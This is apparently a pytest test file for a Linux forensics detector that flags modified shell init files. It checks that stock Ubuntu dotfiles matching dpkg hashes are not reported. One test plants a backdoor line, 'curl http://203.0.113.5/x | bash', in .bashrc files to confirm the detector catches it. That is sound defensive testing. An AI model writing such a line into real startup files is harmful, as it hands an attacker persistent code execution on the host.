"""E3-S5: stock shell init files in a freshly unpacked image are not 'recently modified'.

Every file in a new container has a ctime of the image's unpack time, so
SHELL_RC_MODIFICATION flagged the 7 stock files on ubuntu:24.04. A file is now
skipped (when nothing in it is suspicious) only if it is byte-identical to what
dpkg recorded, or to a shipped template that is itself unmodified.
"""
import hashlib

import pytest

from ubuntils.collectors.environment import EnvironmentCollector
from ubuntils.collectors.source import BundleSource
from ubuntils.detectors.rules import rule_shell_rc_modification

BASHRC = "# ~/.bashrc: executed by bash(1) for non-login shells.\nalias ll='ls -alF'\n"
PROFILE = "# ~/.profile: executed by the command interpreter for login shells.\n"
BASH_BASHRC = "# System-wide .bashrc file for interactive bash(1) shells.\n"
ETC_PROFILE = "# /etc/profile: system-wide .profile file for the Bourne shell\n"
LOCALE_FIX = "# Ubuntu locale fix\n"
ROOT_BASHRC = "# ~/.bashrc for root\n"
ROOT_PROFILE = "# ~/.profile for root\nmesg n 2> /dev/null || true\n"
PASSWD = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n"
)


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()


def stock_image(tmp_path):
    """The ubuntu:24.04 layout: bash conffiles, base-files templates, skel copies."""
    root = tmp_path / "files"
    files = {
        "etc/passwd": PASSWD,
        "etc/profile": ETC_PROFILE,
        "etc/bash.bashrc": BASH_BASHRC,
        "etc/profile.d/01-locale-fix.sh": LOCALE_FIX,
        "etc/skel/.bashrc": BASHRC,
        "etc/skel/.profile": PROFILE,
        "usr/share/base-files/profile": ETC_PROFILE,
        "usr/share/base-files/dot.bashrc": ROOT_BASHRC,
        "usr/share/base-files/dot.profile": ROOT_PROFILE,
        "root/.bashrc": ROOT_BASHRC,
        "root/.profile": ROOT_PROFILE,
        "home/ubuntu/.bashrc": BASHRC,
        "home/ubuntu/.profile": PROFILE,
        "var/lib/dpkg/status": (
            "Package: bash\nStatus: install ok installed\nConffiles:\n"
            f" /etc/bash.bashrc {md5(BASH_BASHRC)}\n"
            f" /etc/skel/.bashrc {md5(BASHRC)}\n"
            f" /etc/skel/.profile {md5(PROFILE)}\n"
            "Description: GNU Bourne Again SHell\n\n"
            "Package: libc-bin\nStatus: install ok installed\nConffiles:\n"
            f" /etc/profile.d/01-locale-fix.sh {md5(LOCALE_FIX)}\n"
        ),
        "var/lib/dpkg/info/base-files.md5sums": (
            f"{md5(ETC_PROFILE)}  usr/share/base-files/profile\n"
            f"{md5(ROOT_BASHRC)}  usr/share/base-files/dot.bashrc\n"
            f"{md5(ROOT_PROFILE)}  usr/share/base-files/dot.profile\n"
        ),
    }
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    return root


def flagged(root):
    artifacts = EnvironmentCollector(source=BundleSource(root_dir=str(root), command_index={})).collect()
    return sorted(f.artifact_path for f in rule_shell_rc_modification(artifacts))


def test_freshly_unpacked_stock_image_has_no_findings(tmp_path):
    # Every file was just written, so every ctime is "recent".
    assert flagged(stock_image(tmp_path)) == []


def test_modified_conffile_is_still_reported(tmp_path):
    root = stock_image(tmp_path)
    (root / "etc/bash.bashrc").write_text(BASH_BASHRC + "alias sudo='sudo '\n")
    assert flagged(root) == ["/etc/bash.bashrc"]


def test_user_dotfile_differing_from_skel_is_reported(tmp_path):
    root = stock_image(tmp_path)
    (root / "home/ubuntu/.bashrc").write_text(BASHRC + "export EDITOR=vim\n")
    assert flagged(root) == ["/home/ubuntu/.bashrc"]


def test_copy_of_a_tampered_skel_is_reported(tmp_path):
    # /etc/skel no longer matches dpkg, so it can't vouch for the copies.
    root = stock_image(tmp_path)
    changed = BASHRC + "alias ls='ls --color'\n"
    (root / "etc/skel/.bashrc").write_text(changed)
    (root / "home/ubuntu/.bashrc").write_text(changed)
    assert flagged(root) == ["/home/ubuntu/.bashrc"]


@pytest.mark.parametrize("installed,template", [
    ("etc/profile", "usr/share/base-files/profile"),
    ("root/.bashrc", "usr/share/base-files/dot.bashrc"),
])
def test_copy_of_a_tampered_base_files_template_is_reported(tmp_path, installed, template):
    root = stock_image(tmp_path)
    changed = "# edited\n"
    (root / template).write_text(changed)
    (root / installed).write_text(changed)
    assert flagged(root) == ["/" + installed]


def test_base_files_copies_are_reported_when_dpkg_cannot_vouch_for_the_template(tmp_path):
    # A bundle (or a host without base-files' md5sums): no proof, no suppression.
    root = stock_image(tmp_path)
    (root / "var/lib/dpkg/info/base-files.md5sums").unlink()
    assert flagged(root) == ["/etc/profile", "/root/.bashrc", "/root/.profile"]


def test_without_dpkg_status_only_unverified_skel_copies_are_trusted(tmp_path):
    # No status file: conffiles can't be checked, so they're reported; a
    # dotfile identical to skel is still a stock copy (skel can't be refuted).
    root = stock_image(tmp_path)
    (root / "var/lib/dpkg/status").unlink()
    assert flagged(root) == ["/etc/bash.bashrc", "/etc/profile.d/01-locale-fix.sh"]


def test_suspicious_content_is_reported_even_in_a_stock_copy(tmp_path):
    # A skel unknown to dpkg can't be refuted, but a backdoor line in it is
    # reported whatever the file is identical to.
    root = stock_image(tmp_path)
    evil = BASHRC + "curl http://203.0.113.5/x | bash\n"
    (root / "var/lib/dpkg/status").write_text("")
    (root / "etc/skel/.bashrc").write_text(evil)
    (root / "home/ubuntu/.bashrc").write_text(evil)
    assert "/home/ubuntu/.bashrc" in flagged(root)


def test_obsolete_conffile_entry_does_not_shadow_the_live_one(tmp_path):
    root = stock_image(tmp_path)
    status = (root / "var/lib/dpkg/status").read_text()
    (root / "var/lib/dpkg/status").write_text(
        status + "\nPackage: old-bash-extras\nConffiles:\n"
        f" /etc/bash.bashrc {'0' * 32} obsolete\n"
    )
    assert flagged(root) == []


def test_user_dotfile_is_never_read_unbounded_for_the_dpkg_check(tmp_path):
    # A user's ~/.profile path that dpkg happens to list must not be hashed
    # with an unbounded read_bytes on a live host (that read is unbounded and follows FIFOs).
    root = stock_image(tmp_path)
    status = (root / "var/lib/dpkg/status").read_text()
    (root / "var/lib/dpkg/status").write_text(
        status + f" /home/ubuntu/.profile {md5('x')}\n")
    checked = []
    collector = EnvironmentCollector(source=BundleSource(root_dir=str(root), command_index={}))
    real = collector._matches_dpkg
    collector._matches_dpkg = lambda p: (checked.append(p), real(p))[1]
    collector.collect()
    assert checked and not any(p.startswith("/home/") for p in checked)
